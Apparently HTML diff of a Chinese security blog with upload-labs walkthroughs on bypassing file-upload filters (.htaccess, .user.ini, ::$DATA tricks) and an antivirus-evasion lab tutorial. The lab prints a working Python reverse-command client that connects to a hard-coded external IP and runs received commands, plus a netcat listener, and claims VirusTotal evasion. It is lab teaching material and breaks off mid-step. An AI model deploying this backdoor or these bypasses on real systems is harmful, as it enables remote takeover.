@@ -164,6 +164,738 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-uploadlabs" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/29/uploadlabs/">uploadlabs</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/09/29/uploadlabs/" class="archive-article-date">
+  	<time datetime="2021-09-29T10:53:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44426869/article/details/104236854">https://blog.csdn.net/weixin_44426869/article/details/104236854</a><br>检测方法：<br>1.前端检测：一般用js。绕过方法：1.禁用js。2.直接改数据包<br>2.type检测：检测的是数据包中<code>Content-Type</code>的部分，是前端根据文件类型生成数据包时加的部分，并不会影响程序所以没什么用。绕过：在发包之前改成需要的就行。<br>3.文件后缀检测：获取文件名之后，通过字符串截取的方法来获取后缀来判断。<br>截取一般包含以下几部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); &#x2F;&#x2F;收尾去空和部分不合法字符 &#x2F;&#x2F;(1)</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 &#x2F;&#x2F;(2)</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); &#x2F;&#x2F;截取包括点以后的字符串()</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 &#x2F;&#x2F;(3)</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA &#x2F;&#x2F;(4)</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 &#x2F;&#x2F;(5)</span><br></pre></td></tr></table></figure>
+<pre><code>可以根据缺少哪一部分来判断怎么改：
+(1)在后面添空格
+(2)在文件名后面加点，在服务端再次生成文件的时候会自动删去
+(3)大小写绕过，随便改后缀的大小写
+    （大小写绕过原理：Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。Linux系统下，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。）（还是那句话，前提是要开启这个功能，反正phpstudy没开）
+(4)方法1：```::$DATA```绕过：直接在文件名后面加```::$DATA```(注意：连接木马的时候不要把```::$DATA```复制到网址)
+   方法2：所有```str_ireplace()```函数都可以“双鞋绕过”，比如检查的是```::$DATA```，那就可以```::$D::$DATAATA```，如果检查的是```php```，那就可以```phphpp```
+(5)意义不明，不知道怎么绕
+(6)补充：原文件的后缀不是目的，让文件在服务器上的文件后缀可识别才是目的。比如Pass-10中，文件名是去除末尾的点之后的状态，所以可以用两点绕过：```hack.php. .```
+</code></pre>
+<p>一般用于对照的文件后缀有以下这些：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.user.ini&quot;</span><br></pre></td></tr></table></figure>
+<pre><code>可以根据缺少的过滤后缀来确定绕过方法
+(1) &quot;.php&quot;=&quot;.php5&quot;=&quot;.php4&quot;=&quot;.php3&quot;=&quot;.php2&quot;(前提：开)
+(2) .htaccess:
+    创建```1.htaccess```，并将其上传：
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;上传的图片马的文件名&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+    再上传图片马即可。(前提：开)
+    补充：htaccess文件介绍：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
+    其中.htaccess文件内容：
+    SetHandler application/x-httpd-php
+    设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。
+(3) .user.ini:
+    这个题目的前提是，上传目录内本来就有一个php文件，假设文件名为：```readme.php```
+    先上传一个以auto_prepend_file=1.gif为内容的.user.ini文件，然后再上传一个内容为php的一句话的脚本，命名为1.gif，.user.ini文件里面的意思是：所有的php文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。
+    然后访问```readme.php```就可以了
+    (另：首先很多的php不一定支持自己写ini，其次有些老版的服务器不一定支持实时检测.user.ini所以实际操作不是很现实)
+</code></pre>
+<p>刷到：Pass-12</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/29/uploadlabs/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-uploadlabs-4" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/28/uploadlabs-4/">uploadlabs-4</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/09/28/uploadlabs-4/" class="archive-article-date">
+  	<time datetime="2021-09-28T13:10:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</span><br></pre></td></tr></table></figure>
+<p>但是没有禁.htaccess文件，这个文件的作用是定义某些文件通过什么方式读取<br>所以创建一个.htaccess文件<br>写入代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;hack.png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
+<p>意思是把hack.jpg文件当php文件读取<br>（但是需要提前开启这个功能,而且必须是apache漏洞）（phpstudy的修改如下<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34115824/article/details/92053939">https://blog.csdn.net/weixin_34115824/article/details/92053939</a> ）</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/28/uploadlabs-4/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-病毒检测绕过" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <center>病毒检测绕过</center>
+
+<h2 id="【目的】"><a href="#【目的】" class="headerlink" title="【目的】"></a>【目的】</h2><p>让学员通过该实验的练习主要掌握：<br>·基本的病毒分类及其制作方法<br>·病毒特征及检测方法<br>·病毒检测的绕过方法</p>
+<h2 id="【环境】"><a href="#【环境】" class="headerlink" title="【环境】"></a>【环境】</h2><p>&emsp;&emsp;操作机：kali，靶机：win10</p>
+<h2 id="【工具】"><a href="#【工具】" class="headerlink" title="【工具】"></a>【工具】</h2><p>&emsp;&emsp;python3，php7，netcat，msf，x64dbg，SigThief， donut，burpsuite ，中国蚁剑</p>
+<h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>·检测技术</p>
+<p>&emsp;&emsp;签名检测技术：PE文件数字签名是Authenticode数字签名格式，用于验证二进制程序的来源和完整性。<br>&emsp;&emsp;基于PKCS #7公开密钥加密标准签名数据，并使用X.509证书关联二进制文件和发布者。<br>&emsp;&emsp;在PE文件数据目录表中，存储着签名信息偏移地址和大小。<br>&emsp;&emsp;签名的验证可以使用Wintrust.lib库中的WinVerifyTrust函数实现。<br>&emsp;&emsp;其中验证包括签名是否存在以及签名是否有效。<br>&emsp;&emsp;签名存在只需要验证签名是否为\x00，签名有效通过hash值判断</p>
+<p>&emsp;&emsp;特征码扫描技术：其基本机制为将扫描信息与病毒数据库（即所谓的“病毒特征库”）进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。<br>&emsp;&emsp;杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码。<br>&emsp;&emsp;在病毒样本中，抽取特征代码，抽取的代码比较特殊，不大可能与普通正常程序代码吻合。<br>&emsp;&emsp;抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。</p>
+<p>·免杀技术<br>&emsp;&emsp;签名绕过：签名伪造的方式有两种，一种是在文件尾部添加伪造的签名数据，也就是本实验所用到的方法，但是并不能绕过hash值验证。另一种方法是修改系统签名获取机制。这种方法需要劫持dll难度较大。<br>&emsp;&emsp;加壳免杀：软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。<br>&emsp;&emsp;花指令免杀：花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。<br>&emsp;&emsp;拆分PE文件：在特征码扫描中，为了保证不误杀，往往会提取同一个PE文件的多个特征码进行匹配，只有一个文件同时拥有这些特征码时才会被判定为木马文件，那么就可以利用将一个PE文件拆分成多个文件，分别上传来防止被检测。<br>&emsp;&emsp;加载器编写：shellcode由于可以随意地进行变化和还原，杀软的查杀难度较大。因此将木马shellcode化，再进行shellcode免杀是目前最流行的免杀方式之一。shellcode是一种地址无关代码，只要给他EIP就能够开始运行。shellcode已经有了，但是还需要获得运行权限，而加载器就是为了顺利运行shellcode。<br>&emsp;&emsp;二分PE：对于PE文件类型来说，并不能提取shellcode。相对于shellcode的没有地址标记，bin文件也是如此，所以我们用bin文件代替PE文件。同样的我们也需要一个加载器运行bin文件<br>&emsp;&emsp;混淆免杀：通过一定规律的编码算法，将对metaspolit、CS生成的shellcode进行编码/模糊处理/变形，从原始shellcode中删除所有无效的字符，从而逃避杀毒软件检测。<br>&emsp;&emsp;垃圾字符：有些老式的主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。所以可以通过构造大文件来绕过。</p>
+<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="1-安装及配置环境"><a href="#1-安装及配置环境" class="headerlink" title="1.安装及配置环境"></a>1.安装及配置环境</h3><h4 id="1-1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为-2021。"><a href="#1-1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为-2021。" class="headerlink" title="1.1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为 2021。"></a>1.1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为 2021。</h4>
+
+<h4 id="1-2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。"><a href="#1-2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。" class="headerlink" title="1.2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。"></a>1.2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。</h4>
+
+<h4 id="1-3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。"><a href="#1-3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。" class="headerlink" title="1.3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。"></a>1.3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。</h4>
+
+<h4 id="1-4检查windows-defender"><a href="#1-4检查windows-defender" class="headerlink" title="1.4检查windows defender"></a>1.4检查windows defender</h4><p>&emsp;&emsp;实验中发现windows defender的自动检测功能可能会在开机后以及待机恢复后自动开启。为了防止干扰试验，请先检查windows配置，方法为“设置”——“windows安全中心”——“病毒和威胁防护”——“病毒和威胁防护”设置下的“管理设置”，将“实时防护”改为“关”。</p>
+
+
+<h4 id="1-5开启apache"><a href="#1-5开启apache" class="headerlink" title="1.5开启apache"></a>1.5开启apache</h4><p>&emsp;&emsp;点击桌面上的phpstudy，将“Apache2.4.39”启动</p>
+
+
+<h4 id="1-6本实验的环境拓扑如下图"><a href="#1-6本实验的环境拓扑如下图" class="headerlink" title="1.6本实验的环境拓扑如下图"></a>1.6本实验的环境拓扑如下图</h4>
+<p>准备一台kali操作机一台Win10靶机和一个外网centos操作机来搭建实验环境（因为家用ip一般都会变动，所以用服务器，来避免每次实验都重写木马的外网ip），kali的内网ip为192.168.43.86，监听4444端口，windows10靶机的内网ip为192.168.43.106，centos操作机的外网ip为110.40.245.122，监听9999端口<br>实验上传文件备份于靶机右侧的文件夹中，内含“帮助文档”来介绍文件的用途</p>
+<h3 id="2-签名验证绕过实验"><a href="#2-签名验证绕过实验" class="headerlink" title="2.签名验证绕过实验"></a>2.签名验证绕过实验</h3><h4 id="2-1利用msf生成exe木马"><a href="#2-1利用msf生成exe木马" class="headerlink" title="2.1利用msf生成exe木马"></a>2.1利用msf生成exe木马</h4>
+
+<h4 id="2-2尝试上传"><a href="#2-2尝试上传" class="headerlink" title="2.2尝试上传"></a>2.2尝试上传</h4>
+
+<h4 id="2-3查看结果"><a href="#2-3查看结果" class="headerlink" title="2.3查看结果"></a>2.3查看结果</h4><p>&emsp;&emsp;并没有我们上传的文件，说明被删除。</p>
+
+
+<h4 id="2-4为木马添加签名"><a href="#2-4为木马添加签名" class="headerlink" title="2.4为木马添加签名"></a>2.4为木马添加签名</h4>
+
+<h4 id="2-5再次上传"><a href="#2-5再次上传" class="headerlink" title="2.5再次上传"></a>2.5再次上传</h4>
+
+<h4 id="2-6验证结果"><a href="#2-6验证结果" class="headerlink" title="2.6验证结果"></a>2.6验证结果</h4>
+
+<h3 id="3-加壳绕过实验"><a href="#3-加壳绕过实验" class="headerlink" title="3.加壳绕过实验"></a>3.加壳绕过实验</h3><h4 id="3-1开启模拟病毒检测脚本"><a href="#3-1开启模拟病毒检测脚本" class="headerlink" title="3.1开启模拟病毒检测脚本"></a>3.1开启模拟病毒检测脚本</h4>
+<p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py<br>&emsp;&emsp;检测脚本代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">print(&quot;开始检测&quot;)</span><br><span class="line">while(1):</span><br><span class="line"></span><br><span class="line">    # 获取目标文件夹的路径</span><br><span class="line">    filedir &#x3D; os.getcwd()</span><br><span class="line">    # 获取当前文件夹中的文件名称列表</span><br><span class="line">    filenames &#x3D; os.listdir(filedir)</span><br><span class="line">    for filename in filenames:</span><br><span class="line">        if (filename!&#x3D;&#39;test.py&#39; and filename!&#x3D;&#39;upload_file.php&#39; and filename!&#x3D;&#39;index.html&#39; and filename!&#x3D;&#39;nginx.htaccess&#39; and filename!&#x3D;&#39;.htaccess&#39;):</span><br><span class="line">            e &#x3D; open(filename, &#39;rb&#39;)</span><br><span class="line">            a &#x3D; e.read(6997712)</span><br><span class="line">            e.close()</span><br><span class="line">            e &#x3D; open(filename, &#39;rb&#39;)</span><br><span class="line">            b &#x3D; e.read(2048)</span><br><span class="line">            e.close()</span><br><span class="line">            #print(b)</span><br><span class="line">            sear &#x3D; re.search(rb&#39;\x65\x2e\x68\x13\xda\x69\xf9\x54\xea\xc1\xbc\x42\x11\xa6\x8a\xf9\xfc\x4b\xe5\x52\x71\xc1\xcd\x13\x32\xe5\x8c\x93\x93\x87\x79\xc7\x85\x8b\x89\x98\x7c\x69\xa6\xe5\xe7\x41\x0f\x8b\x24\x40\x89\xc3\xad&#39;,a)</span><br><span class="line">            sear1 &#x3D;re.search(rb&#39;\x48\x89\x5c\x24\x08\x57\x48\x83\xec\x20\x8b\xf9\xe8\x37\xab\x00\x00\x48\x8b\x18\xe8\x27\xab\x00\x00\x48\x8b\xd3\x8b\x08\xe8\x9d\x53\x00\x00\x48\x8b\xd0\x8b\xcf\x48\x8b\x5c\x24\x30\x48\x83\xc4\x20\x5f\xe9\xd9\x17\x00\x00\xcc&#39;,b)</span><br><span class="line"></span><br><span class="line">            e &#x3D; open(filename, &#39;rb&#39;)</span><br><span class="line">            c&#x3D;e.read()</span><br><span class="line">            e.close()</span><br><span class="line">            sear2 &#x3D; re.search(rb&#39;\xF6\x8B\xEC\x81\x0B\x0C\x04\x00\x00\xB8\xD7\x02\x4F\x00\x4E\x56\xA3\xE8\x17\x41\x00\xA3\xA8\x0B\x41\x00\xA3\x44\xD7\x47\x00\xA3\xC7\xB1\x41\x00\x33\xDB\x88\x48\xFB\x41\x00\x57\x8D\x45\xE1\x53\x8D\x4D\x08\x50\x51\xC7\x05\xF0\x17\x41\x00\x44\xD2\x40\x00\x88\x1D\x18\x3C\x41\x00\xE8\xD6\x4C\x00\x00\x68\xE0\x5F\x40\x9E\x2B\xD8\xA4\x00\x00\x83\xC4\x04\xCC\x53\x53\x68\x42\x40\x41\x00\xE8\x3D\x3E\x00\x15\x8B\x55\x0C\x8B\x45\x08&#39;,c)</span><br><span class="line"></span><br><span class="line">            #print(sear)</span><br><span class="line">            #print(sear1)</span><br><span class="line">            #print(filename)</span><br><span class="line">            if (((sear !&#x3D; None) and (sear1 !&#x3D;None)) or sear2 !&#x3D;None):</span><br><span class="line">                print(&quot;已删除文件&quot;+filename)</span><br><span class="line">                os.remove(filename)</span><br><span class="line">            else:</span><br><span class="line">                if(re.search(&#39;.exe&#39;,filename)):</span><br><span class="line">                    print(&quot;开始运行程序&quot;)</span><br><span class="line">                    #val&#x3D;os.popen(filename)</span><br><span class="line">                if(filename&#x3D;&#x3D;&#39;peloader.py&#39;):</span><br><span class="line">                    print(&quot;开始运行程序&quot;)</span><br><span class="line">                    val&#x3D;os.popen(&quot;python &quot;+filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    time.sleep(10)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>此脚本主要模拟了“特征码检测”的方法，为了确定特征码的有效性，提取地点为程序的text节，为了防止误报，部分程序提取了两个部分的特征码。才用每十秒检测一次的形式，如果被检测出病毒，脚本会自动删除文件；如果检测为“安全”，脚本会模拟人为操作“运行文件”。然后我上传了一个没有病毒的main.exe文件，并未被检测出来，并成功运行。</p>
+
+
+<h4 id="3-2在操作机上上访问-http-192-168-43-106-8082"><a href="#3-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="3.2在操作机上上访问 http://192.168.43.106:8082/"></a>3.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
+
+<h4 id="3-3在操作机上传client1-exe文件"><a href="#3-3在操作机上传client1-exe文件" class="headerlink" title="3.3在操作机上传client1.exe文件"></a>3.3在操作机上传client1.exe文件</h4>
+<p>&emsp;&emsp;client1.exe是由python脚本用pyinstaller转化而来的远程rce木马，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"># 文件名：client.py</span><br><span class="line"></span><br><span class="line"># 导入 socket、sys 模块</span><br><span class="line">import socket</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 创建 socket 对象</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"># 获取本地主机名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 设置端口号</span><br><span class="line">port &#x3D; 9999</span><br><span class="line"></span><br><span class="line"># 连接服务，指定主机和端口</span><br><span class="line">s.connect((&quot;110.40.245.122&quot;, port))</span><br><span class="line"></span><br><span class="line">while(1):</span><br><span class="line">    # 接收小于 1024 字节的数据</span><br><span class="line">    msg &#x3D; s.recv(1024)</span><br><span class="line">    val&#x3D;os.popen(msg.decode(&#39;utf-8&#39;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #print (msg.decode(&#39;utf-8&#39;))</span><br><span class="line">    #print(val)</span><br><span class="line">    #print(type(val))</span><br><span class="line">    #val&#x3D;str(val)</span><br><span class="line">    #print(type(val))</span><br><span class="line">    for temp in val.readlines():</span><br><span class="line">        #print(temp)</span><br><span class="line">        s.send(temp.encode(&#39;utf-8&#39;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(msg&#x3D;&#x3D;&#39;exit&#39;):</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure>
+<p>这个脚本的作用是远程RCE，即运行后向固定ip（操作机，因为家用机的ip会改变，所以我使用了服务器）发送连接请求，连接成功后接收对方的字符串并以指令方式执行，然后回传给操作机。<br>下图为病毒在virustotal的检测情况，可以看到本身绕过了360，腾讯，火绒，Microsoft等比较出名的杀毒检测。从这里我们可以得出：自己写的病毒很难被检测，现行的杀毒软件大部分还是针对市面上比较常见的病毒生成器和造成大规模伤害的病毒。<br><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/d1e1ef77e50b85dc38ec1c0af18f669a6f832866f00bceed94b0cd8b78e2a46e">https://www.virustotal.com/gui/file/d1e1ef77e50b85dc38ec1c0af18f669a6f832866f00bceed94b0cd8b78e2a46e</a></p>
+
+
+<h4 id="3-4靶机脚本检测出木马，删除此文件"><a href="#3-4靶机脚本检测出木马，删除此文件" class="headerlink" title="3.4靶机脚本检测出木马，删除此文件"></a>3.4靶机脚本检测出木马，删除此文件</h4>
+
+<h4 id="3-5在操作机再次上传经过upx加壳后的client2-exe文件，靶机脚本未检测出木马，并运行"><a href="#3-5在操作机再次上传经过upx加壳后的client2-exe文件，靶机脚本未检测出木马，并运行" class="headerlink" title="3.5在操作机再次上传经过upx加壳后的client2.exe文件，靶机脚本未检测出木马，并运行"></a>3.5在操作机再次上传经过upx加壳后的client2.exe文件，靶机脚本未检测出木马，并运行</h4>
+
+<h4 id="3-6centos操作机监听并运行指令"><a href="#3-6centos操作机监听并运行指令" class="headerlink" title="3.6centos操作机监听并运行指令"></a>3.6centos操作机监听并运行指令</h4><p>在centos操作机上运行nc -l -v 9999，建立连接后运行dir，获取目录信息</p>
+
+
+<h3 id="4-花指令绕过实验"><a href="#4-花指令绕过实验" class="headerlink" title="4.花指令绕过实验"></a>4.花指令绕过实验</h3><h4 id="4-1开启模拟病毒检测脚本"><a href="#4-1开启模拟病毒检测脚本" class="headerlink" title="4.1开启模拟病毒检测脚本"></a>4.1开启模拟病毒检测脚本</h4><p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py</p>
+
+
+<h4 id="4-2在操作机上上访问-http-192-168-43-106-8082"><a href="#4-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="4.2在操作机上上访问 http://192.168.43.106:8082/"></a>4.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
+
+<h4 id="4-3在操作机上传client1-exe文件"><a href="#4-3在操作机上传client1-exe文件" class="headerlink" title="4.3在操作机上传client1.exe文件"></a>4.3在操作机上传client1.exe文件</h4>
+
